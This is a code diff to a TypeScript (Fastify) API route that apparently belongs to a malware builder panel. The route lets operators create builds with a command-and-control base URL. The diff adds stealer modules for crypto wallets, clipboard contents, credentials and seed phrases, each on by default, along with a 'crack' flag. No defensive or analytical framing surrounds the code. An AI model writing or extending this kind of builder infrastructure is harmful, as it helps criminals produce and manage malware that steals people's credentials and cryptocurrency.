@@ -15,7 +15,14 @@ const createSchema = z.object({
   name: z.string().min(2).max(64),
   version: z.string().regex(/^\d+\.\d+\.\d+$/),
   profile: z.enum(['lite', 'full']).default('full'),
-  c2_base: z.string().url().optional()
+  c2_base: z.string().url().optional(),
+  modules: z.object({
+    wallets: z.boolean().default(true),
+    clipboard: z.boolean().default(true),
+    credentials: z.boolean().default(true),
+    seeds: z.boolean().default(true)
+  }).optional(),
+  crack: z.boolean().optional()
 });
 
 export const buildRoutes: FastifyPluginAsync = async (app) => {
@@ -45,7 +52,7 @@ export const buildRoutes: FastifyPluginAsync = async (app) => {
 
   app.post('/builds', { preHandler: requireRole('admin') }, async (request, reply) => {
     const input = createSchema.parse(request.body);
-    const created = await createBuild({ ...input, operatorId: request.operator!.id });
+    const created = await createBuild({ ...input, operatorId: request.operator!.id, modules: input.modules, crack: input.crack });
     await audit(prisma, { operatorId: request.operator?.id, action: 'build.create', entity: 'build', entityId: created.id, ip: request.clientIp, data: { name: input.name, version: input.version, profile: input.profile } });
     return reply.code(201).send({ id: created.id, buildId: created.buildId, token: created.token, config: created.config });
   });
